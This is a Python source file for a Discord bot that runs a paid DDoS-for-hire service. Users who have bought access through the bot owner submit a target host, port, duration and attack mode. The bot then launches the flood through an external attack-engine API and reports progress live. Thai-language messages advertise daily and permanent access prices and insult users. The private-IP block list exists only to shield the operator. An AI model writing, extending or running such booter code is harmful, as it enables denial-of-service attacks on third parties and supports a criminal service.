# bot.py
import asyncio
import ipaddress
import os
import re
import time
import traceback
from urllib.parse import urlparse

import discord
from discord.ext import commands

from config import (
    BOT_TOKEN, PREFIX, OWNER_ID, MAX_DURATION,
    FORBIDDEN_TLDS, FORBIDDEN_IPS, DATA_DIR,
)
from database import Database
from attack_engine import AttackEngine
from ui_v2 import (
    build_panel, AttackModal, build_mode_select,
    build_attack_running,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
engine = AttackEngine()

active_attacks: dict[int, dict] = {}


# ═══════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════
def _extract_host(target: str) -> str:
    t = target.strip().lower()
    if "://" in t:
        return urlparse(t).hostname or ""
    if t.startswith("["):
        end = t.find("]")
        if end > 0:
            return t[1:end]
    return t.split("/")[0].split(":")[0]


def is_forbidden(target: str) -> bool:
    host = _extract_host(target)
    if not host:
        return False
    if any(host == tld.lstrip(".") or host.endswith(tld) for tld in FORBIDDEN_TLDS):
        return True
    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return True
    except ValueError:
        pass
    return host in FORBIDDEN_IPS


def _parse_duration(s: str):
    s = s.strip()
    if s.upper() == "TH":
        return 0
    if len(s) < 2:
        return None
    try:
        n = int(s[:-1])
    except ValueError:
        return None
    unit = s[-1].lower()
    if unit == "m":
        return n * 60
    if unit == "h":
        return n * 3600
    if unit == "d":
        return n * 86400
    return None


# ═══════════════════════════════════════════
# Events
# ═══════════════════════════════════════════
@bot.event
async def on_ready():
    os.makedirs(DATA_DIR, exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MemberNotFound):
        await ctx.send("หา member ไม่เจอ")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        print(f"[err] {error}")
        traceback.print_exception(type(error), error, error.__traceback__)


# ═══════════════════════════════════════════
# !ddos — panel
# ═══════════════════════════════════════════
@bot.command(name="ddos", aliases=["panel"])
async def ddos_cmd(ctx):
    try:
        await ctx.send(
            view=build_panel(),
            flags=discord.MessageFlags.components_v2,
        )
    except TypeError:
        await ctx.send(view=build_panel())


# ═══════════════════════════════════════════
# !vi / !unvi
# ═══════════════════════════════════════════
@bot.command(name="vi")
async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
        return
    if member is None:
        await ctx.send("ใช้: `!vi @user 1h` (TH = ถาวร)")
        return

    secs = _parse_duration(duration)
    if secs is None:
        await ctx.send("รูปแบบ: 1m / 1h / 1d / TH")
        return

    forever = secs == 0
    await db.add_virus(member.id, secs, forever)

    if forever:
        await ctx.send(f"ให้ไวรัส **{member.mention}** (ถาวร)")
    else:
        await ctx.send(f"ให้ไวรัส **{member.mention}** ({duration})")


@bot.command(name="unvi")
async def unvi_cmd(ctx, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
        return
    if member is None:
        await ctx.send("ใช้: `!unvi @user`")
        return
    await db.remove_virus(member.id)
    await ctx.send(f"ปลดไวรัส **{member.mention}** แล้ว")


# ═══════════════════════════════════════════
# Panel button → modal
# ═══════════════════════════════════════════
async def open_attack_modal(interaction: discord.Interaction):
    user_id = interaction.user.id
    has = await db.has_virus(user_id)
    if not has:
        await interaction.response.send_message(
            "มาซื้อไวรัสมาาาา แค่วันละ 40 เอง ถาวร 300",
            ephemeral=True,
        )
        return
    if engine.is_running(user_id) or engine.any_running():
        await interaction.response.send_message(
            "รอของเก่าหมดก่อน", ephemeral=True
        )
        return
    await interaction.response.send_modal(AttackModal())


# ═══════════════════════════════════════════
# Modal submit → mode select
# ═══════════════════════════════════════════
async def handle_attack_submit(interaction: discord.Interaction, modal):
    user_id = interaction.user.id

    if not await db.has_virus(user_id):
        await interaction.response.send_message(
            "มาซื้อไวรัสมาาาา", ephemeral=True
        )
        return

    if engine.is_running(user_id) or engine.any_running():
        await interaction.response.send_message(
            "รอของเก่าหมดก่อน", ephemeral=True
        )
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        duration = min(int(modal.duration.value), MAX_DURATION)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง", ephemeral=True
        )
        return

    if port < 1 or port > 65535:
        await interaction.response.send_message(
            "Port ต้อง 1-65535", ephemeral=True
        )
        return

    if duration < 1:
        await interaction.response.send_message(
            "Time ต้องมากกว่า 0", ephemeral=True
        )
        return

    if is_forbidden(target):
        await interaction.response.send_message(
            "ห้ามยิงไอ้ควายอ่านกฎด้วย", ephemeral=True
        )
        return

    try:
        await interaction.response.send_message(
            view=build_mode_select(user_id, target, port, duration),
            ephemeral=True,
            flags=discord.MessageFlags.components_v2,
        )
    except TypeError:
        await interaction.response.send_message(
            view=build_mode_select(user_id, target, port, duration),
            ephemeral=True,
        )


# ═══════════════════════════════════════════
# Mode selected → start attack
# ═══════════════════════════════════════════
async def start_attack(interaction: discord.Interaction, mode: str,
                       target: str, port: int, duration: int):
    user_id = interaction.user.id

    if not await db.has_virus(user_id):
        await interaction.response.send_message(
            "มาซื้อไวรัสมาาาา", ephemeral=True
        )
        return

    if engine.is_running(user_id) or engine.any_running():
        await interaction.response.send_message(
            "รอของเก่าหมดก่อน", ephemeral=True
        )
        return

    try:
        await interaction.response.edit_message(
            view=build_attack_running(
                target=target, port=port, mode=mode,
                time_left=duration, total=duration, speed="...",
            ),
        )
    except Exception:
        traceback.print_exc()
        return

    msg = await interaction.original_response()
    await db.log_attack(user_id, target, port, mode, duration)

    state = {
        "target": target,
        "port": port,
        "mode": mode,
        "duration": duration,
        "msg": msg,
        "task": None,
        "start": time.time(),
    }
    active_attacks[user_id] = state
    state["task"] = asyncio.create_task(_attack_loop(user_id, state))


async def _attack_loop(user_id: int, state: dict):
    target = state["target"]
    port   = state["port"]
    mode   = state["mode"]
    total  = state["duration"]
    msg: discord.Message = state["msg"]

    async def on_tick(time_left, hits, speed):
        try:
            await msg.edit(
                view=build_attack_running(
                    target=target, port=port, mode=mode,
                    time_left=time_left, total=total,
                    speed=speed, hits=hits,
                ),
            )
        except discord.HTTPException:
            pass

    try:
        # ยิงผ่าน API
        result = await engine.attack_via_api(target, port, total, mode)

        if not result.get("success"):
            await on_tick(0, 0, f"API Error: {result.get('error', 'unknown')}")
            return

        # API ไม่มี callback → ต้องนับเวลาเอง
        start = time.time()
        last = start
        while time.time() - start < total:
            await asyncio.sleep(1)
            elapsed = time.time() - start
            time_left = max(0, int(total - elapsed))
            speed = await engine.measure_speed(target, port)
            await on_tick(time_left, 1, speed)

    except asyncio.CancelledError:
        pass
    except Exception:
        traceback.print_exc()
    finally:
        active_attacks.pop(user_id, None)
        try:
            await msg.edit(
                view=build_attack_running(
                    target=target, port=port, mode=mode,
                    time_left=0, total=total,
                    speed="finished", hits=0,
                ),
            )
        except Exception:
            pass


# ═══════════════════════════════════════════
# Run
# ═══════════════════════════════════════════
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise SystemExit("❌ BOT_TOKEN ยังไม่ได้ตั้ง")
    os.makedirs(DATA_DIR, exist_ok=True)
    bot.run(BOT_TOKEN)